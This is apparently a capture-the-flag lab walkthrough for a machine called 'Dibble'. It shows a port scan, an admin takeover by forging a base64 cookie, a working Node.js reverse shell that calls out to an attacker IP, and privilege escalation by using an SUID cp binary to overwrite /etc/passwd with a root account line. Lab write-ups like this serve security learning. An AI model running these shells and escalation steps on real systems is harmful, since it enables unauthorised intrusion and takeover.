# Dibble

## Gaining Access

Nmap scan:

```
$ nmap -p- --min-rate 3000 -Pn 192.168.157.110
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-16 12:24 +08
Nmap scan report for 192.168.157.110
Host is up (0.17s latency).
Not shown: 65530 filtered tcp ports (no-response)
PORT      STATE SERVICE
21/tcp    open  ftp
22/tcp    open  ssh
80/tcp    open  http
3000/tcp  open  ppp
27017/tcp open  mongod
```

FTP accepts anonymous logins but there's nothing within it.&#x20;

### Web Enum --> Admin Takeover

Port 80 shows a blog about some web exploits:

<figure><img src="../../../.gitbook/assets/image (487).png" alt=""><figcaption></figcaption></figure>

Port 3000 shows a more dynamic incident reporting site:

<figure><img src="../../../.gitbook/assets/image (3288).png" alt=""><figcaption></figcaption></figure>

I registed a new account and looked at the events:

<figure><img src="../../../.gitbook/assets/image (509).png" alt=""><figcaption></figcaption></figure>

Doesn't look super relevant. I checked Burpsuite, and noticed this cookie:

<figure><img src="../../../.gitbook/assets/image (505).png" alt=""><figcaption></figcaption></figure>

When decoded, it gives `default`. I changed it to a `base64` encoded `admin` string, giving `YWRtaW4=`, which allows us to create logs.

### RCE

The new log event specified that we can write code in it:

<figure><img src="../../../.gitbook/assets/image (1551).png" alt=""><figcaption></figcaption></figure>

The `X-Powered-By` header specified that this was using Express, which is Javascript. Since we can directly write code, I tried putting in a Node.js reverse shell:

```javascript
(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("bash", []);
    var client = new net.Socket();
    client.connect(21, "192.168.45.196", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; // Prevents the Node.js application from crashing
})();
```

When we submit thiss, we get a reverse shell:

<figure><img src="../../../.gitbook/assets/image (485).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation

### cp SUID --> Root

`cp` is an SUID binary on this machine:

```
[benjamin@dibble ~]$ find / -perm -u=s -type f 2>/dev/null
/usr/bin/cp
```

We can use this to overwrite files, just add this line into a copy of the current `/etc/passwd`:

```
hacker:$1$ZNhJDyK2$vksoiVz4W8rhrWm8BKxWK/:0:0::/root:/bin/bash
```

Then, use `cp` to overwrite the existing `/etc/passwd` file and `su` to `hacker` with 'hello123':

<figure><img src="../../../.gitbook/assets/image (2031).png" alt=""><figcaption></figcaption></figure>
